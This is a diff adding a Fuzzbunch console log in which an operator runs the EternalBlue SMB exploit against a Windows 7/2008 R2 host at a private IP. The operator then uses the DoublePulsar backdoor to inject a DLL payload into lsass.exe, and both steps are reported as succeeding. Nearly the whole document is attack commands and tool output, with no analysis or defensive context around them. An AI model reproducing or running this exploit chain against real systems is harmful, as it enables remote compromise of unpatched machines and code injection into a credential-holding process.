@@ -1,0 +1,101 @@
+
+--[ Version 3.5.1
+
+[*] Loading Plugins
+fb > use EternalBlue
+
+[!] Entering Plugin Context :: Eternalblue
+[*] Applying Global Variables
+
+fb Special (Eternalblue) > set NetworkTimeout 10
+[+] Set NetworkTimeout => 10
+fb Special (Eternalblue) > set TargetIP 10.170.45.176
+[+] Set TargetIP => 10.170.45.176
+fb Special (Eternalblue) > execute
+
+[!] Preparing to Execute Eternalblue
+
+[*]  Mode :: Delivery mechanism
+
+   *0) FB       Traditional deployment from within FUZZBUNCH
+    1) DANE     Forward deployment via DARINGNEOPHYTE
+
+[+] Run Mode: 0
+
+
+Module: Eternalblue
+===================
+
+Name                  Value                                                 
+----                  -----                                                 
+DaveProxyPort         0                                                     
+NetworkTimeout        10                                                    
+TargetIp              10.170.45.176                                         
+TargetPort            445                                                   
+VerifyTarget          False                                                 
+VerifyBackdoor        True                                                  
+MaxExploitAttempts    3                                                     
+GroomAllocations      12                                                    
+ShellcodeBuffer                                                             
+Target                WIN72K8R2                                             
+
+[*] Executing Plugin
+[+] Eternalblue Succeeded
+
+fb Special (Eternalblue) > 
+fb Special (Eternalblue) > use Doublepulsar
+
+[!] Entering Plugin Context :: Doublepulsar
+[*] Applying Global Variables
+
+fb Payload (Doublepulsar) > set NetworkTimeout 10
+[+] Set NetworkTimeout => 10
+fb Payload (Doublepulsar) > set TargetIP 10.170.45.176
+[+] Set TargetIP => 10.170.45.176
+fb Payload (Doublepulsar) > set DllPayload G:\go.dll
+[+] Set DllPayload => G:\go.dll
+fb Payload (Doublepulsar) > set Architecture x86
+[+] Set Architecture => x86
+fb Payload (Doublepulsar) > execute
+
+[!] Preparing to Execute Doublepulsar
+[*] Redirection OFF
+
+[+] Configure Plugin Local Tunnels
+[+] Local Tunnel - local-tunnel-1
+[+] (TCP) Local 10.170.45.176:445
+
+[+] Configure Plugin Remote Tunnels
+
+
+Module: Doublepulsar
+====================
+
+Name                  Value                                                 
+----                  -----                                                 
+NetworkTimeout        10                                                    
+TargetIp              10.170.45.176                                         
+TargetPort            445                                                   
+DllPayload            G:\go.dll                                             
+DllOrdinal            1                                                     
+ProcessName           lsass.exe                                             
+ProcessCommandLine                                                          
+Protocol              SMB                                                   
+Architecture          x86                                                   
+Function              RunDLL                                                
+
+[*] Executing Plugin
+[+] Doublepulsar Succeeded
+
+fb Payload (Doublepulsar) > echo Initializing Fuzzbunch v3.5.1
+[*] Initializing Fuzzbunch v3.5.1
+fb Payload (Doublepulsar) > echo Adding Global Variables
+[*] Adding Global Variables
+fb Payload (Doublepulsar) > setg Color True
+[+] Set Color => True
+fb Payload (Doublepulsar) > setg ShowHiddenParameters False
+[+] Set ShowHiddenParameters => False
+fb Payload (Doublepulsar) > setg NetworkTimeout 60
+[+] Set NetworkTimeout => 60
+fb Payload (Doublepulsar) > setg LogDir G:\logs
+[+] Set LogDir => G:\logs
